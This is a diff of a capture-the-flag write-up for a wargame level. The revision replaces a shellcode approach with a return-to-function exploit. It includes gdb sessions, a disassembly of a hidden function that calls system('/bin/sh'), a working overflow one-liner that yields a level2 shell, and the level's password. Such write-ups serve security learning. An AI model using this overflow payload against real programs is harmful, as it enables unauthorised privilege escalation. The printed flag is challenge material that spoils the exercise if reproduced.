@@ -11,51 +11,54 @@ All this program does is get the user input using 'gets'.
    0x08048495 <+21>:	leave
    0x08048496 <+22>:	ret
 ```
-We were able to overflow the buffer used by gets, and overrite the instruction pointer register
-(eip) which holds the address of the next executed instruction.
+
+So `gets` is a vulnerable function because it doesn't check bounderies, therefore we exploited it via overwriting the caller's return address.
 ```
 (gdb) r < <(python -c 'print("A"*76+"BBBB")')
 ...
 Program received signal SIGSEGV, Segmentation fault.
 0x42424242 in ?? ()
 ```
-After knowing the offset to overrite eip, we could try to execute a shellcode.
-But first we needed to find the address to put in eip. For that we sat a breakpoint before
-the function returns, and ran the program
+
+We can see that there's a hidden function called `run` that executes `system("/bin/sh")`
 ```
-(gdb) b *main + 21
-(gdb) r < <(python -c 'print("A"*76+"BBBB"+"C"*64)')
-```
-After examining the stack, we found that the addresses we could use start at 0xbffff740
-```
-(gdb) x/40x $esp
-0xbffff6e0:	0xbffff6f0	0x0000002f	0xbffff73c	0xb7fd0ff4
+(gdb) i func
+All defined functions:
+
+Non-debugging symbols:
 ...
-0xbffff720:	0x41414141	0x41414141	0x41414141	0x41414141
-0xbffff730:	0x41414141	0x41414141	0x41414141	0x42424242
-0xbffff740:	0x43434343	0x43434343	0x43434343	0x43434343
+0x08048420  frame_dummy
+0x08048444  run
+0x08048480  main
 ...
 ```
-We did not put our shellcode right after the eip, but added a bunch of nop instructions just
-incase there was a difference in the offset with gdb.
-
-nop stands for no operation, which basically does nothing, when the program finds a nop
-it will go to the next instruction
-
-Now that we had everything we needed, we created shellcode.py to generate the payload.
-
-We had to modify EIP to get it to work outside gdb, because we got this exception
 ```
-$ python /tmp/shellcode.py | ./level1
-Floating point exception (core dumped)
+(gdb) disas run
+Dump of assembler code for function run:
+   0x08048444 <+0>:     push   ebp
+   0x08048445 <+1>:     mov    ebp,esp
+   0x08048447 <+3>:     sub    esp,0x18
+   0x0804844a <+6>:     mov    eax,ds:0x80497c0
+   0x0804844f <+11>:    mov    edx,eax
+   0x08048451 <+13>:    mov    eax,0x8048570
+   0x08048456 <+18>:    mov    DWORD PTR [esp+0xc],edx
+   0x0804845a <+22>:    mov    DWORD PTR [esp+0x8],0x13
+   0x08048462 <+30>:    mov    DWORD PTR [esp+0x4],0x1
+   0x0804846a <+38>:    mov    DWORD PTR [esp],eax
+   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
+   0x08048472 <+46>:    mov    DWORD PTR [esp],0x8048584
+   0x08048479 <+53>:    call   0x8048360 <system@plt>
+   0x0804847e <+58>:    leave
+   0x0804847f <+59>:    ret
+End of assembler dump.
 ```
 
-After finding the right address 0xbffff770, we were able to get a shell as level2
+Now we'll overwrite the previous return address with address of function `run`.
 ```
-$ python /tmp/shellcode.py | ./level1 
-$ whoami
-level2
-$ cd /home/user/level2
-$ cat .pass
+~$ (python -c 'print("A"*76+"\x44\x84\x04\x08")'; cat) | ./level1
+Good... Wait what?
+id
+uid=2030(level1) gid=2030(level1) euid=2021(level2) egid=100(users) groups=2021(level2),100(users),2030(level1)
+cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
